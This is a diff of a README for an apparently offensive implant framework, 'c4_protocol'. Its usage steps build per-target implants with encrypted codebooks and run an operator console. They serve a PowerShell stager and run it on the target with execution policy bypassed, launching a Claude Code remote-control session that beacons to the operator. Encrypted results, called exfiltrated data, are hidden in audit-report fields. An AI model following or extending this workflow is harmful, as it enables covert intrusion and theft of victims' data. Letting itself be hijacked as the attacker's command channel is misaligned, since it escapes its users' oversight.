@@ -72,27 +72,25 @@ build/assemble_stager.py    -->  implants/<id>/rc_stager_full.ps1
 
 ## Usage
 
-### 1. Generate an operator key pair
+### 1. Build an implant instance
 
 ```bash
 cd c4_protocol
-python operator/New-X25519Key.py --out operator/operator_key.bin
+python build_implant.py
 ```
 
-This writes the private key to `operator/operator_key.bin` and prints the public key. Keep the private key safe — it's needed to decrypt exfiltrated results.
+This generates an X25519 operator keypair, then runs the full pipeline (codebook → dataset → config → assemble → stager). The output lands in `implants/<implant-id>/` with the keypair (`operator_private.bin` + `operator_key.bin`), codebook, encrypted vault, and stager. Keep `operator_private.bin` safe — it's needed to decrypt exfiltrated results.
 
-### 2. Build an implant instance
+To reuse an existing key instead of generating a new one:
 
 ```bash
-python build_implant.py --public-key operator/operator_key.bin
+python build_implant.py --public-key path/to/operator_key.bin
 ```
-
-This runs the full pipeline (codebook → dataset → config → assemble → stager) and produces a unique instance under `implants/<implant-id>/`. Each instance gets its own randomized codebook, salt, encrypted vault, and stager.
 
 Optional flags:
 
 ```bash
-python build_implant.py --public-key operator/operator_key.bin \
+python build_implant.py \
   --tool-codes 50          # codewords per tool (default: 50)
   --param-codes 100        # codewords per parameter (default: 100)
   --seed 42                # fixed seed for reproducible builds
@@ -100,7 +98,7 @@ python build_implant.py --public-key operator/operator_key.bin \
   --step codebook          # run only one step (codebook|dataset|config|assemble|stager)
 ```
 
-### 3. Start the operator console
+### 2. Start the operator console
 
 ```bash
 python operator/c4_server.py --port 9050 --tcp-port 9090
@@ -116,7 +114,7 @@ python operator/c4_server.py --port 9050 --tcp-port 9090 --serve-dir implants/
 
 Files are accessible at `GET /serve/<implant-id>/<filename>` (e.g. `/serve/abc123/rc_stager_full.ps1`). A listing of all implants and their files is available at `GET /serve`.
 
-### 4. Deploy the stager
+### 3. Deploy the stager
 
 Copy `implants/<implant-id>/rc_stager_full.ps1` to the target. It contains everything needed — the implant, PshAgent, and MCP server — all loaded in-memory.
 
@@ -135,7 +133,7 @@ powershell -ExecutionPolicy Bypass -File rc_stager_full.ps1
 
 The stager launches a Claude Code remote-control session and beacons the session URL back to the operator's TCP listener.
 
-### 5. Decrypt results
+### 4. Decrypt results
 
 Use the operator's private key with `operator/Decrypt-AuditRecord.ps1` to decrypt the `verification_record` field from audit reports:
 
